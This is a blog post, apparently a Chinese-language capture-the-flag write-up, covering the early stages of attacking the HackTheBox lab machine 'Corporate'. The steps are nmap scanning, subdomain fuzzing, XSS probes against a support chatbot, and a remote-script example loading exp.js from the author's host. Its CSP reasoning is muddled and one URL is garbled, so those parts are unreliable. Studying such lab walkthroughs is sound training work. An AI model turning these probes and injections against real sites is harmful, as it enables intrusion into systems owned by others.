@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Corporate v2PWN for 4 days. 0x0 基本的information12345678# nmap$ sudo nmap -sS -sC -sV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Corporate">
+<meta property="og:url" content="https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Corporate v2PWN for 4 days. 0x0 基本的information12345678# nmap$ sudo nmap -sS -sC -sV">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152654-3hpzde3.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150215-bsqte2r.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150515-32jnuas.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150851-k90omxs.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223151912-zm6az4z.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152054-wllnlv4.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152433-ars6zn7.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152627-tfxnni6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223154844-opajqqs.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223155413-cng9nyj.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223160424-oc4x3c5.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223160534-ucacdye.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161038-whu1ksd.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161632-g1ohddj.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223161857-1xguc16.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223162520-bwyr3yb.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223163806-a8r0z4t.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223172325-ac0xlyh.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152213-okv6woa.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173006-lo1odmk.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231220230415-88rq059.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154336-j2jzdnk.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154400-zvhv0lb.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222153549-pie8nxz.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152929-hejai7s.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154029-pi4j0r6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173740-9cfg8jb.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222154859-butkyn0.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173852-dmgrss2.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223173936-vm5y47c.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174102-lrslpxr.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174143-eo9smtc.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174554-qa3rsq8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223174744-bcsx6q1.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223175322-07b1ktc.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223175624-l1xbq5m.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223180022-rd2nsk6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201150-d8jw6he.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101181210-gs5e9o4.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101181344-x82mw0o.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101182106-8ch50x3.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201513-vs2305c.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201614-1yv55v9.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101201844-xs2vx5p.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101200526-6fum62l.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202008-yead0ni.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202027-4drbuj6.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202106-lhzd32n.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101202526-n8u1kti.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240101220737-oxlqgkb.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184242-n7je69o.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184403-bbozhp7.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184714-8rc6xu7.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185145-ki8e0rn.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185429-s0o1ctz.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104184936-l2ehzea.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104185524-bnn5csc.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104193508-in30tm4.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20240104194100-y6d5wo8.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223193546-z3u6b1k.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224010439-3josad3.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224010536-0pxpfxe.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011450-frahvbu.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011136-epyalnr.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011232-cbjdh3v.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011700-qrbnyl0.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231224011846-q9fuq6u.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223210954-5u0nr3j.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211234-3to3zt9.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211407-vn40xwj.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211603-4vn8h76.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211612-all7y5u.png">
+<meta property="og:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223211704-m7e4e7f.png">
+<meta property="article:published_time" content="2024-01-01T10:15:12.000Z">
+<meta property="article:modified_time" content="2024-07-15T18:53:42.274Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152654-3hpzde3.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Corporate</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/01/09/2024-htb-machine/01-Bizness/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/12/19/2023/2023-12-elk-and-json/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&text=HackTheBox - Machine - Corporate"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&is_video=false&description=HackTheBox - Machine - Corporate"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Corporate&body=Check out this article: https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&title=HackTheBox - Machine - Corporate"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&name=HackTheBox - Machine - Corporate&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/01/01/2023-htb-machine/12-corporate/&t=HackTheBox - Machine - Corporate"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Corporate
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-01T10:15:12.000Z" class="dt-published" itemprop="datePublished">2024-01-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Corporate-v2"><a href="#Corporate-v2" class="headerlink" title="Corporate v2"></a>Corporate v2</h1><p>PWN for 4 days.</p>
+<h2 id="0x0-基本的information"><a href="#0x0-基本的information" class="headerlink" title="0x0 基本的information"></a>0x0 基本的information</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap</span></span><br><span class="line">$ sudo nmap -sS -sC -sV -oA nmap --min-rate=1000 -vv -T5 10.129.xx.xx</span><br><span class="line">80/tcp open  http    syn-ack ttl 63 OpenResty web app server 1.21.4.3</span><br><span class="line">|_http-server-header: openresty/1.21.4.3</span><br><span class="line">|_http-title: Did not follow redirect to http://corporate.htb</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>看到有domain，隨手ffuf一下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u <span class="string">&quot;http://10.129.xx.xx&quot;</span> -H <span class="string">&quot;Host: FUZZ.corporate.htb&quot;</span>  -w /Tools/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -fs 175</span><br><span class="line"></span><br><span class="line">[Status: 200, Size: 1725, Words: 383, Lines: 39, Duration: 151ms]</span><br><span class="line">    * FUZZ: support</span><br><span class="line"></span><br><span class="line">[Status: 403, Size: 159, Words: 3, Lines: 8, Duration: 163ms]</span><br><span class="line">    * FUZZ: git</span><br><span class="line"></span><br><span class="line">[Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 171ms]</span><br><span class="line">    * FUZZ: sso</span><br><span class="line"></span><br><span class="line">[Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 157ms]</span><br><span class="line">    * FUZZ: people</span><br></pre></td></tr></table></figure>
+
+<p>隨手加入到hosts。</p>
+<p>GIT 永遠都是 403</p>
+<h2 id="0x1-support-corporate-htb"><a href="#0x1-support-corporate-htb" class="headerlink" title="0x1 support.corporate.htb"></a>0x1 support.corporate.htb</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231222152654-3hpzde3.png" alt="image">​</p>
+<p>看到有機器人，好像在對話，最容易想到的就是XSS攻擊，所以測試下XSS是否工作。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150215-bsqte2r.png" alt="image">​</p>
+<p>Rabbit Hole: <code>CSWSH</code>​ 其實在這裏不會工作。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150515-32jnuas.png" alt="image">​</p>
+<p>隨手輸入 <code>&lt;img src=&quot;asdaa&quot;/&gt;</code>​  結果變成了一張裂開的圖片，説明這裏可以xss攻擊。</p>
+<h2 id="0x2-尋找-XSS-注入點"><a href="#0x2-尋找-XSS-注入點" class="headerlink" title="0x2 尋找 XSS 注入點"></a>0x2 尋找 XSS 注入點</h2><p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223150851-k90omxs.png" alt="image">​</p>
+<p>看這段 http 頭，可以看到有一個 <code>unsafe-inline</code>​，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy</span><br><span class="line">	base-uri <span class="string">&#x27;self&#x27;</span>; default-src <span class="string">&#x27;self&#x27;</span> http://corporate.htb http://*.corporate.htb; style-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;unsafe-inline&#x27;</span> https://fonts.googleapis.com https://maps.googleapis.com https://maps.gstatic.com; font-src <span class="string">&#x27;self&#x27;</span> https://fonts.googleapis.com/ https://fonts.gstatic.com data:; img-src <span class="string">&#x27;self&#x27;</span> data: maps.gstatic.com; frame-src https://www.google.com/maps/; object-src <span class="string">&#x27;none&#x27;</span>; script-src <span class="string">&#x27;self&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>unsafe-inline</strong>: This allows the use of inline resources, such as inline elements, javascript: URLs, inline event handlers, and inline elements. Again this is not recommended for security reasons.</p>
+<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></p>
+</blockquote>
+<p>因爲這裏有  <code>unsafe-inline</code>​ ，所以不可以直接xss到遠程（類似：<code>script src=&quot;http://mane/exp.js&quot; </code>​），CSP會檢查js的目的地是哪裏。</p>
+<p>但是如果是使用了<code>unsafe-inline</code>​ ，CSP允許使用内部的函數跳轉，但不可以直接在html使用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>​，允許<code>&lt;script src=&quot;http://localhost/a.js&quot;&gt; &lt;script/&gt;</code>​，所以就要把命令注入到某個js文件，這些js通常都是動態的，用它自身的脚本的函數去跳轉。</p>
+<h2 id="0x3-尋找可利用的js文件"><a href="#0x3-尋找可利用的js文件" class="headerlink" title="0x3 尋找可利用的js文件"></a>0x3 尋找可利用的js文件</h2><p>​<code>support.corporate.htb</code>​ 似乎沒有找到比較感興趣的js文件，不過來到 <a target="_blank" rel="noopener" href="http://corporate.htb/">http://corporate.htb​​</a></p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223151912-zm6az4z.png" alt="image">​</p>
+<p>現在有一堆js，我們只允許修改 <code>v=</code>​ 後面的内容，就有機會注入到js裏面，然後就有機會向裏面注入函數。</p>
+<p>正常情況下，js一般都是靜態文件，如下：</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152054-wllnlv4.png" alt="image">​</p>
+<p>但是 <code>http://corporate.htb/https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/js/analytics.min.js?</code>​ 會修改内容</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152433-ars6zn7.png" alt="image">​</p>
+<p>也就是説這個脚本有機會利用注入。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Corporate-MW3oeP3wP6FbAIW/image-20231223152627-tfxnni6.png" alt="image">​</p>
+<p>放到這裏 <a target="_blank" rel="noopener" href="https://deobfuscate.relative.im/">https://deobfuscate.relative.im/</a> 反混淆看一下。</p>
